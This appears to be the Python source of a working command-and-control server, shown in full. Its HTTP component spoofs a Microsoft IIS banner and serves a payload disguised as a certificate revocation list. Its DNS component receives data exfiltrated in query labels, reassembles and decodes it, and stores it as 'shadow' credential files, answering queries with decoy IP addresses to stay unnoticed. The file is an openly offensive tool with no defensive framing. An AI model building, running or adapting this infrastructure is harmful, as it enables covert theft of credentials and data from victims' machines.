import base64
import os
import random
import time
import threading

from collections import defaultdict
from http.server import BaseHTTPRequestHandler, HTTPServer
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, QTYPE, A

sessions = defaultdict(dict)


class C2HTTPHandler(BaseHTTPRequestHandler):
    server_version = "Microsoft-IIS/10.0"
    sys_version = ""  # Suppresses the "Python/3.x" signature

    PAYLOAD_MAP = {
        "/public/revoke.crl": "public/revoke.crl",
    }


    # --- Handlers ---

    def do_GET(self):
        """
        Handles payload delivery (Dropping files to the victim).
        """
        # Clean the path to prevent traversal attacks
        request_path = self.path.split('?')[0] # Ignore query params

        if request_path in self.PAYLOAD_MAP:
            file_path = self.PAYLOAD_MAP[request_path]
            self._serve_file(file_path)
        else:
            # OpSec: Return a generic 404 to avoid leaking info
            self._send_custom_response(404, "Not Found")

    def do_POST(self):
        pass

    # --- Helpers ---

    def _serve_file(self, file_path):
        """Helper to read and serve a file safely."""
        if os.path.exists(file_path) and os.path.isfile(file_path):
            try:
                with open(file_path, 'rb') as f:
                    content = f.read()
                
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(content)))
                self.send_header("Connection", "close")
                self.end_headers()
                
                self.wfile.write(content)
                print(f"[HTTP] [GET] Served payload: {file_path} to {self.client_address[0]}")
            
            except Exception as e:
                print(f"[!] Error serving file: {e}")
                self._send_custom_response(500, "Internal Error")
        else:
            print(f"[!] File not found on disk: {file_path}")
            self._send_custom_response(404, "Not Found")

    def _send_custom_response(self, code, message):
        """Helper to send simple status responses."""
        self.send_response(code)
        self.end_headers()
        self.wfile.write(message.encode())


class C2DNSResolver(BaseResolver):
    
    # Pool of realistic IPs to simulate legitimate responses
    REALISTIC_IP_POOL = [
        "8.8.8.8",      # Google DNS
        "8.8.4.4",      # Google DNS
        "1.1.1.1",      # Cloudflare
        "1.0.0.1",      # Cloudflare
        "208.67.222.222", # OpenDNS
        "208.67.220.220", # OpenDNS
        "192.168.1.1",  # Common Gateway
        "10.0.0.1",     # Common Gateway
    ]

    def resolve(self, request, handler):
        """
        Main handler for DNS resolution.
        Parses the query, handles exfiltration data, and returns a realistic A record.
        """
        qname = str(request.q.qname).rstrip(".")
        labels = qname.split(".")
        
        # safely retrieve source IP
        source_ip = self._get_source_ip(handler)
        print(f"[DNS] Query received from {source_ip}: {qname}")

        # Expected format: SESSION_ID.SEQ_NUM.DATA.example.com
        # We need at least 4 labels to match this pattern
        if len(labels) >= 4:
            session_id = labels[0]
            seq_num = labels[1]
            data_chunk = labels[2]
            
            self._handle_exfiltration_data(source_ip, session_id, seq_num, data_chunk)

        # Generate the DNS reply
        reply = request.reply()
        reply.add_answer(RR(
            qname,
            QTYPE.A,
            rdata=A(self._get_random_ip()),
            ttl=60 # Increased TTL slightly to look more realistic
        ))
        return reply

    def _handle_exfiltration_data(self, source_ip, session_id, seq_num, data_chunk):
        """
        Orchestrates the storage and reassembly of data chunks.
        """
        print(f"[DNS] [{source_ip}] Session: {session_id}, Seq: {seq_num}, Data: {data_chunk[:15]}...")

        if seq_num == "END":
            self._finalize_session(source_ip, session_id)
        else:
            self._store_fragment(source_ip, session_id, seq_num, data_chunk)

    def _store_fragment(self, source_ip, session_id, seq_num, data_chunk):
        """
        Stores a single data fragment in the session buffer.
        """
        try:
            seq_int = int(seq_num)
            # Ensure the session dict exists (depending on your global setup)
            if session_id not in sessions:
                sessions[session_id] = {}
                
            sessions[session_id][seq_int] = data_chunk
            print(f"[DNS] [{source_ip}] Fragment stored: session={session_id}, seq={seq_int}, total_fragments={len(sessions[session_id])}")
        except ValueError:
            print(f"[!] Invalid sequence number received: {seq_num}")

    def _finalize_session(self, source_ip, session_id):
        """
        Reassembles, decodes, and saves the full session data to a specific file.
        """
        print(f"[DNS] [{source_ip}] Finalizing session {session_id}")
        
        if session_id not in sessions or not sessions[session_id]:
            print(f"[!] Session {session_id} is empty or does not exist")
            return

        # Reassemble chunks in order
        ordered_data = ''.join(
            sessions[session_id][k] for k in sorted(sessions[session_id])
        )

        try:
            decoded_msg = self._safe_base64_decode(ordered_data)
            self._log_success(source_ip, session_id, decoded_msg)
            self._save_to_file(session_id, decoded_msg)
            
        except Exception as e:
            print(f"[!] Error decoding session {session_id}: {e}")
        
        # Cleanup memory
        del sessions[session_id]

    def _save_to_file(self, session_id, content):
        """
        Saves the decoded content to /c2/credentials/shadow_<sess_id>.
        """
        # Ensure directory exists
        output_dir = "/c2/credentials/new"
        os.makedirs(output_dir, exist_ok=True)
        
        filename = f"{output_dir}/shadow_{session_id}"
        
        try:
            with open(filename, "w") as f:
                f.write(content)
            print(f"[Disk] Data saved to {filename}")
        except IOError as e:
            print(f"[!] Disk Write Error: {e}")

    def _safe_base64_decode(self, data):
        """
        Handles Base64 padding and decoding.
        """
        # Add padding if missing
        padding = 4 - (len(data) % 4)
        if padding != 4:
            data += "=" * padding
            
        return base64.urlsafe_b64decode(data).decode(errors="ignore")

    def _get_random_ip(self):
        """Returns a random IP from the realistic pool."""
        return random.choice(self.REALISTIC_IP_POOL)

    def _get_source_ip(self, handler):
        """Safely extracts client IP."""
        return handler.client_address[0] if handler and hasattr(handler, 'client_address') else "unknown"

    def _log_success(self, ip, session, message):
        """Pretty prints the reconstructed message."""
        print(f"\n{'='*60}")
        print(f"[+] Message reconstructed from {ip} (session {session}):")
        print(f"{'='*60}")
        # Print only first 200 chars to avoid flooding console if file is huge
        print(message[:200] + ("..." if len(message) > 200 else "")) 
        print(f"{'='*60}\n")


if __name__ == "__main__":
    HTTP_BIND_IP = "0.0.0.0"
    HTTP_PORT = 8080
    DNS_BIND_IP = "0.0.0.0"
    DNS_PORT = 53

    print("\n" + "="*50)
    print("      [*] STARTING COMMAND & CONTROL (C2)      ")
    print("="*50 + "\n")

    # HTTP Server (File Transfer)
    try:
        http_server = HTTPServer((HTTP_BIND_IP, HTTP_PORT), C2HTTPHandler)
        http_thread = threading.Thread(target=http_server.serve_forever, daemon=True)
        http_thread.start()
        print(f"[+] HTTP Server listening on {HTTP_BIND_IP}:{HTTP_PORT} (TCP)")
    except Exception as e:
        print(f"[!] Failed to start HTTP Server: {e}")

    # DNS Server (Exfiltration)
    try:
        dns_resolver = C2DNSResolver()
        dns_server = DNSServer(dns_resolver, port=DNS_PORT, address=DNS_BIND_IP)
        dns_server.start_thread()
        print(f"[+] DNS Server listening on {DNS_BIND_IP}:{DNS_PORT} (UDP)")
    except Exception as e:
        print(f"[!] Failed to start DNS Server: {e}")

    # Keep-Alive Loop
    print("\n[*] Servers are active. Waiting for implants to connect...")
    print("[*] Press Ctrl+C to stop.\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n[!] User interrupted. Stopping servers...")
        
        # Graceful shutdown
        if 'http_server' in locals():
            http_server.shutdown()
            http_server.server_close()
        if 'dns_server' in locals():
            dns_server.stop()
            
        print("[*] C2 Shutdown complete.")